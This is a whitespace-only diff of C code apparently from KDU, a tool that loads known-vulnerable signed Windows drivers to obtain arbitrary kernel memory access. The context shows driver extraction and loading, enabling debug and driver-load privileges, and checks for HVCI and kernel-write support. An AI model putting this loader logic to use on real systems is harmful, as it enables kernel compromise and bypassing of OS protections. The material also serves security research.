@@ -92,7 +92,7 @@ PKDU_PROVIDER KDUProvGetReference()
 //        /*if (prov->SignatureWHQL)
 //            printf_s("\tDriver is WHQL signed\r\n");*/
 //        //
-//        // Some Realtek drivers are digitally signed 
+//        // Some Realtek drivers are digitally signed
 //        // after binary modification with wrong PE checksum as result.
 //        // Note: Windows 7 will not allow their load.
 //        //
@@ -178,8 +178,8 @@ BOOL KDUProvLoadVulnerableDriver(
         Context->Provider->IgnoreChecksum ? FALSE : TRUE);
 
     if (drvBuffer == NULL) {
-        
-        /*supPrintfEvent(kduEventError, 
+
+        /*supPrintfEvent(kduEventError,
             "[!] Driver resource id cannot be found %lu\r\n", uResourceId);*/
 
         return FALSE;
@@ -198,7 +198,7 @@ BOOL KDUProvLoadVulnerableDriver(
 
     if (resourceSize != writeBytes) {
 
-        /*supPrintfEvent(kduEventError, 
+        /*supPrintfEvent(kduEventError,
             "[!] Unable to extract vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);*/
 
         return FALSE;
@@ -213,10 +213,10 @@ BOOL KDUProvLoadVulnerableDriver(
         bLoaded = TRUE;
     }
     else {
-        
-        /*supPrintfEvent(kduEventError, 
+
+        /*supPrintfEvent(kduEventError,
             "[!] Unable to load vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);*/
-        
+
         DeleteFile(lpFullFileName);
     }
 
@@ -244,10 +244,10 @@ BOOL KDUProvStartVulnerableDriver(
     // Check if driver already loaded.
     //
     if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {
-        
-        //supPrintfEvent(kduEventError, 
+
+        //supPrintfEvent(kduEventError,
         //    "[!] Vulnerable driver is already loaded\r\n");
-        
+
         bLoaded = TRUE;
     }
     else {
@@ -317,8 +317,8 @@ void KDUProvStopVulnerableDriver(
 
     ntStatus = supUnloadDriver(lpDriverName, TRUE);
     if (!NT_SUCCESS(ntStatus)) {
-        
-        /*supPrintfEvent(kduEventError, 
+
+        /*supPrintfEvent(kduEventError,
             "[!] Unable to unload vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);*/
 
     }
@@ -572,7 +572,7 @@ HINSTANCE KDUProviderLoadDB(
     }
     else {
 
-        /*supPrintfEvent(kduEventError, 
+        /*supPrintfEvent(kduEventError,
             "[!] Could not load drivers database, GetLastError %lu\r\n", GetLastError());*/
 
     }
@@ -623,10 +623,10 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
         // Check HVCI support.
         //
         if (HvciEnabled && prov->SupportHVCI == 0) {
-            
-            /*supPrintfEvent(kduEventError, 
+
+            /*supPrintfEvent(kduEventError,
                 "[!] Abort: selected provider does not support HVCI\r\n");*/
-            
+
             break;
         }
 
@@ -635,19 +635,19 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
         //
 
         if (NtBuildNumber < prov->MinNtBuildNumberSupport) {
-            
-            /*supPrintfEvent(kduEventError, 
+
+            /*supPrintfEvent(kduEventError,
                 "[!] Abort: selected provider require newer Windows NT version\r\n");*/
-            
+
             break;
         }
 
         if (prov->MaxNtBuildNumberSupport != KDU_MAX_NTBUILDNUMBER) {
             if (NtBuildNumber > prov->MaxNtBuildNumberSupport) {
-                
-                /*supPrintfEvent(kduEventError, 
+
+                /*supPrintfEvent(kduEventError,
                     "[!] Abort: selected provider does not support this Windows NT version\r\n");*/
-                
+
                 break;
             }
         }
@@ -685,7 +685,7 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
             //
             if ((PVOID)prov->Callbacks.WriteKernelVM == (PVOID)KDUProviderStub) {
 
-                /*supPrintfEvent(kduEventError, 
+                /*supPrintfEvent(kduEventError,
                     "[!] Abort: selected provider does not support arbitrary kernel write.\r\n");*/
 
 #ifndef _DEBUG
@@ -714,19 +714,19 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
 
         ntStatus = supEnablePrivilege(SE_DEBUG_PRIVILEGE, TRUE);
         if (!NT_SUCCESS(ntStatus)) {
-            
-            /*supPrintfEvent(kduEventError, 
+
+            /*supPrintfEvent(kduEventError,
                 "[!] Abort: SeDebugPrivilege is not assigned! NTSTATUS (0x%lX)\r\n", ntStatus);*/
-            
+
             break;
         }
 
         ntStatus = supEnablePrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
         if (!NT_SUCCESS(ntStatus)) {
-            
-            /*supPrintfEvent(kduEventError, 
+
+            /*supPrintfEvent(kduEventError,
                 "[!] Abort: SeLoadDriverPrivilege is not assigned! NTSTATUS (0x%lX)\r\n", ntStatus);*/
-            
+
             break;
         }
 
@@ -735,10 +735,10 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
         //
         Context = (KDU_CONTEXT*)supHeapAlloc(sizeof(KDU_CONTEXT));
         if (Context == NULL) {
-            
-            /*supPrintfEvent(kduEventError, 
+
+            /*supPrintfEvent(kduEventError,
                 "[!] Abort: could not allocate provider context\r\n");*/
-            
+
             break;
         }
 
@@ -786,7 +786,7 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
                         UlongToPtr(Context->Provider->ResourceId)))
                     {
 
-                        /*supPrintfEvent(kduEventError, 
+                        /*supPrintfEvent(kduEventError,
                             "[!] Could not register driver, GetLastError %lu\r\n", GetLastError());*/
 
                     }
@@ -828,7 +828,7 @@ VOID WINAPI KDUProviderRelease(
         //
         if ((PVOID)Context->Provider->Callbacks.UnregisterDriver != KDUProviderStub) {
             Context->Provider->Callbacks.UnregisterDriver(
-                Context->DeviceHandle, 
+                Context->DeviceHandle,
                 (PVOID)Context);
         }
 
